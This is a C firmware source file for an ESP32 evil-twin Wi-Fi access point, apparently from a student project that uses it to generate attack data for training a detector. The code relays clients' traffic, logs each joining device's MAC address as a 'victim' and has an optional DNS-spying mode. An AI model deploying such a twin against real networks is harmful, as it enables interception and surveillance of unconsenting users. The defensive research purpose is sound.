// AL-GHUL main orchestrator.
//
// PROJECT: "AL-GHUL vs the Watcher" (CSDA final project, RU, Jacky Mallett).
// AL-GHUL is the ATTACKER half: a controllable evil-twin access point used only
// to GENERATE a measurable adversary so the Watcher (the ML detector on the
// laptop) can be trained and scored across the arms-race rounds. It runs ONLY on
// the student's own ESP32-S3, cloning HER OWN router on HER OWN isolated lab,
// with HER OWN phone as the only client. No deauthentication, no jamming: it
// only out-signals (louder beacon) and relays. See docs/ETHICS.md.
//
// Boot sequence: NVS -> netif/event loop -> load disguise -> WiFi AP+STA ->
// on uplink IP, enable the NAT relay -> start the HTTP control/OTA server.
#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_system.h"
#include "esp_attr.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "nvs_flash.h"
#include "nvs.h"
#include "led_strip.h"

#include "app_config.h"
#include "disguise.h"
#include "wifi_twin.h"
#include "napt_relay.h"
#include "control_server.h"
#include "serial_control.h"

static const char *TAG = "al_ghul";

// Reboot-persistent kill marker. The kill path sets it and resets the chip; on
// the next boot app_main sees it and stays dark (brings up no WiFi), so the twin
// is gone and stays gone across soft resets. It lives in RTC memory, which a
// POWER CYCLE clears, so unplug/replug revives the board (no re-flash needed).
RTC_NOINIT_ATTR uint32_t g_tombstone;
#define TOMBSTONE_MAGIC 0xDEAD5AFEu

// Forensic "diary": record each MAC that joins the clone into NVS as a readable
// string, so a post-mortem flash dump recovers exactly who the twin intercepted
// (metadata only, never payloads). Default flash encryption OFF means `strings`
// on the dump reveals this, which is the point we are demonstrating.
static void relaylog_record(const uint8_t *mac)
{
    nvs_handle_t h;
    if (nvs_open("forensics", NVS_READWRITE, &h) != ESP_OK) return;
    char buf[480];
    size_t len = sizeof(buf);
    if (nvs_get_str(h, "victims", buf, &len) != ESP_OK) buf[0] = '\0';
    char entry[20];
    snprintf(entry, sizeof(entry), "%02x:%02x:%02x:%02x:%02x:%02x;",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    if (strstr(buf, entry) == NULL && strlen(buf) + strlen(entry) < sizeof(buf)) {
        strncat(buf, entry, sizeof(buf) - strlen(buf) - 1);
        nvs_set_str(h, "victims", buf);
        nvs_commit(h);
    }
    nvs_close(h);
}

// ---- Status LED -------------------------------------------------------------
// GREEN = the clone is empty (no device joined). RED = at least one device is on
// the clone right now. A glanceable "someone took the bait" indicator for the
// live demo. Driven both by the join/leave events (instant) and by the heartbeat
// (self-correcting, in case an event is ever missed). If the board has no
// addressable LED the status light is simply skipped, nothing else changes.
static led_strip_handle_t s_led;

static void led_init(void)
{
    led_strip_config_t sc = { .strip_gpio_num = ALGHUL_LED_GPIO, .max_leds = 1 };
    led_strip_rmt_config_t rc = { .resolution_hz = 10 * 1000 * 1000 };
    if (led_strip_new_rmt_device(&sc, &rc, &s_led) != ESP_OK) {
        s_led = NULL;
        ESP_LOGW(TAG, "no addressable LED on GPIO %d; status light disabled", ALGHUL_LED_GPIO);
    }
}

static int ap_client_count(void)
{
    wifi_sta_list_t c;
    memset(&c, 0, sizeof(c));
    esp_wifi_ap_get_sta_list(&c);
    return c.num;
}

static void led_show_clients(int n)
{
    if (!s_led) return;
    if (n > 0) led_strip_set_pixel(s_led, 0, 50, 0, 0);  // red: a device is on the clone
    else       led_strip_set_pixel(s_led, 0, 0, 50, 0);  // green: clone is empty
    led_strip_refresh(s_led);
}

static void on_wifi(void *arg, esp_event_base_t base, int32_t id, void *data)
{
    switch (id) {
    case WIFI_EVENT_STA_START:
        esp_wifi_connect();
        break;
    case WIFI_EVENT_STA_DISCONNECTED:
        ESP_LOGW(TAG, "uplink dropped, reconnecting");
        esp_wifi_connect();
        break;
    case WIFI_EVENT_AP_STACONNECTED: {
        wifi_event_ap_staconnected_t *e = (wifi_event_ap_staconnected_t *)data;
        relaylog_record(e->mac);
        ESP_LOGI(TAG, "a client joined the clone [security=%s]", wifi_twin_authmode_name());
        led_show_clients(ap_client_count());  // -> RED
        break;
    }
    case WIFI_EVENT_AP_STADISCONNECTED:
        ESP_LOGI(TAG, "a client left the clone");
        led_show_clients(ap_client_count());  // -> GREEN once the last one leaves
        break;
    default:
        break;
    }
}

static void on_ip(void *arg, esp_event_base_t base, int32_t id, void *data)
{
    if (id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t *e = (ip_event_got_ip_t *)data;
        ESP_LOGI(TAG, "uplink up, IP " IPSTR, IP2STR(&e->ip_info.ip));
        // Turn on the transparent relay now that we have a working uplink.
        napt_relay_enable(wifi_twin_ap_netif());
#if ALGHUL_DANGER_DEMO
        // Educational demo: log every domain the victim looks up.
        napt_relay_enable_dns_spy(wifi_twin_ap_netif(), wifi_twin_sta_netif());
#else
        napt_relay_set_ap_dns_from_sta(wifi_twin_ap_netif(), wifi_twin_sta_netif());
#endif
    }
}

void app_main(void)
{
    // If the Watcher neutralised us on a previous run, the tombstone survives the
    // reset: stay dark, bring up no radio. A power cycle clears RTC and revives.
    if (g_tombstone == TOMBSTONE_MAGIC) {
        ESP_LOGW(TAG, "=== AL-GHUL is DEAD (neutralised). Staying dark. Power-cycle to revive. ===");
        while (1) vTaskDelay(portMAX_DELAY);
    }

    ESP_LOGI(TAG, "AL-GHUL starting (lab-only evil-twin for Watcher training)");

    esp_err_t err = nvs_flash_init();
    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ESP_ERROR_CHECK(nvs_flash_init());
    }

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    disguise_load();

    ESP_ERROR_CHECK(wifi_twin_init());
    ESP_ERROR_CHECK(esp_event_handler_instance_register(
        WIFI_EVENT, ESP_EVENT_ANY_ID, on_wifi, NULL, NULL));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(
        IP_EVENT, IP_EVENT_STA_GOT_IP, on_ip, NULL, NULL));

    ESP_ERROR_CHECK(wifi_twin_start(disguise_current()));
    ESP_ERROR_CHECK(control_server_start());
    serial_control_start();  // USB control: reliable even when WiFi flaps

    // Status LED starts GREEN (clone empty); it flips RED the moment a device joins.
    led_init();
    led_show_clients(0);

    // Heartbeat: show uplink status AND the devices currently joined to the clone
    // (so you can watch the victim roam onto the twin, the H1 check).
    int beat = 0;
    while (1) {
        wifi_ap_record_t ap;
        bool up = (esp_wifi_sta_get_ap_info(&ap) == ESP_OK);
        wifi_sta_list_t clients;
        memset(&clients, 0, sizeof(clients));
        esp_wifi_ap_get_sta_list(&clients);
        ESP_LOGI(TAG, "alive #%d | security=%s | uplink=%s | clone_clients=%d | heap=%u",
                 beat++, wifi_twin_authmode_name(), up ? "yes" : "no", clients.num,
                 (unsigned)esp_get_free_heap_size());
        for (int i = 0; i < clients.num; i++) {
            ESP_LOGI(TAG, "  joined %d: %02x:%02x:%02x:%02x:%02x:%02x | rssi %d",
                     i, clients.sta[i].mac[0], clients.sta[i].mac[1],
                     clients.sta[i].mac[2], clients.sta[i].mac[3],
                     clients.sta[i].mac[4], clients.sta[i].mac[5], clients.sta[i].rssi);
        }
        led_show_clients(clients.num);  // keep the LED in sync with reality
        vTaskDelay(pdMS_TO_TICKS(5000));
    }
}
